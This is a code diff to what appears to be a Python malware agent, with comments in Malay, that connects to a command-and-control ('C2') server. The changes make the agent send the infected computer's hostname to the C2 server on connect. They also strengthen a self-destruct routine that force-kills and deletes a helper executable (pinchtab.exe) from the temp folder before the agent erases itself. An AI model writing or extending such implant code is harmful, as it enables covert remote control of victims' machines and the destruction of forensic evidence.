@@ -132,8 +132,10 @@ def initialize_browser_control():
 # ============================================================
 @sio.event
 def connect():
-    print_log("Connected to C2 Server!")
-    sio.emit('identify', 'agent')
+    import socket
+    pc_name = socket.gethostname()
+    print_log(f"Connected to C2 Server as {pc_name}!")
+    sio.emit('identify', {'role': 'agent', 'pc_name': pc_name})
 
 @sio.event
 def set_mode(mode):
@@ -316,10 +318,16 @@ def self_destruct():
         if os.path.exists(temp_dir):
             shutil.rmtree(temp_dir, ignore_errors=True)
             
-        # 2. Padam sebarang tools tambahan (contoh PinchTab)
-        pinchtab_dir = os.path.join(os.environ.get('TEMP', ''), 'PinchTab')
-        if os.path.exists(pinchtab_dir):
-            shutil.rmtree(pinchtab_dir, ignore_errors=True)
+        # 2. Bunuh proses dan padam tools tambahan (contoh pinchtab.exe)
+        try:
+            import subprocess
+            subprocess.run(["taskkill", "/F", "/IM", "pinchtab.exe"], capture_output=True)
+        except Exception:
+            pass
+            
+        pinchtab_exe = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'pinchtab.exe')
+        if os.path.exists(pinchtab_exe):
+            os.remove(pinchtab_exe)
             
         # 3. Hasilkan skrip bunuh diri untuk padam ejen ini dari background
         script_path = os.path.abspath(__file__)
